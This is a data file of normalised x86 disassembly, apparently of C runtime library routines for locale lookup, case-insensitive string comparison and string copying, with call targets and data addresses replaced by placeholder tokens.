mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_410b69
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_4090d0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_41a271
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
call sub_4077b7
sub_41ace4
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_40af3b
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_41aac3
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_410f30
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_40c2b0
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_40c01b
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_4090d0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_410b69
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4077b7
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_4090d0
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rwxdata
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_409812
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_4121cc
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_409812
push [ ebx + 0x54 ]
call sub_409812
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rwxdata ]
lea eax [ ebp - 0x188 ]
push eax
call sub_41d4ce
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_41b01e
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_41a95e
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_41ace4
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_41aac3
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_410f30
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_41ace4
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_41475c
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_40c2b0
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_41b7b0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_41a271
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_4077b7
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_41ace4
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_41ea30
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_41b23a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_40c060
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_40c060
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_4078ae
mov [ eax ] 0xc
push edi
push 0x220
call sub_40c060
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_409812
mov eax [ esi ]
mov ecx rwxdata
call sub_41a562
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
call sub_41b01e
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_409812
push esi
call sub_409812
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_40b8a5
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_40bd13
push [ esi ]
call sub_40bdac
push esi
call sub_409812
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_409812
push [ esi ]
call sub_40bd13
push [ esi ]
call sub_40bdac
push esi
call sub_409812
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_41b33a
push 0x14
push r--data
call sub_408380
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_40af3b
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_40bf44
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_40c060
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b4a9
mov eax [ ebp - 0x20 ]
push 0xc
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_41a562
and [ ebp - 0x4 ] 0x0
call sub_41b46c
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_41b01e
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_4083c5
retn
push ebx
call sub_40bd13
push ebx
call sub_40bdac
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_40bef7
push ebx
call sub_40bd13
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rwxdata
push [ ebp + 0xc ]
call sub_410f30
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_41b478
jmp r-xdata
test [ rwxdata ] 0x1
jne r-xdata
mov [ rwxdata ] edi
push [ edi ]
push rwxdata
call sub_40bef7
pop ecx
pop ecx
mov eax [ rwxdata ]
mov ecx [ eax + 0xbc ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rwxdata ] ecx
mov eax [ eax + 0xac ]
mov [ rwxdata ] eax
sub_41b4bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_406900
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_4078ae
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40c530
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_41a46c
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41209f
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41b5d0
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41b4bb
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_41b600
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_41b68b
mov edi edi
push ebp
mov ebp esp
push esi
push [ rwxdata ]
call [ DecodePointer@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
mov eax esi
pop esi
pop ebp
retn
sub_41b736
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_4078ae
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_407823
mov eax esi
jmp r-xdata
sub_41b7b0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_41b7f6
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41ee97
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_41b86c
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_410f30
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_410f30
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_41b6bf
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_41b8f0
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_41b915
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_41b946
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_41b961
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_40af3b
mov edx edi
mov esi eax
call sub_41b915
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_41ee97
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_41b8f0
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_405894
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_41ba08
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_41b946
push esi
mov edi eax
call sub_40c2b0
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_41ba63
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_40af3b
mov edx edi
lea esi [ eax + 0x9c ]
call sub_41b915
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_41ee97
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41ee97
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41ee97
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_414709
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41ee97
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_40c2b0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_41b8f0
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_40c2b0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_41ba08
pop ecx
pop ecx
test eax eax
je r-xdata
sub_41bc34
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_40af3b
mov edx edi
lea esi [ eax + 0x9c ]
call sub_41b915
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41ee97
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_405894
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41ee97
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_41ba08
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_41bcf4
push [ esi + 0x4 ]
call sub_40c2b0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_41b961
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
retn
and [ esi + 0x8 ] 0x0
sub_41bd20
push [ esi ]
call sub_40c2b0
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_40c2b0
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_41b946
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_41ba63
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_41bd87
push [ esi ]
call sub_40c2b0
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_41b946
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_41bc34
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_41bdc3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_40af3b
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_41b7f6
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_41b86c
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
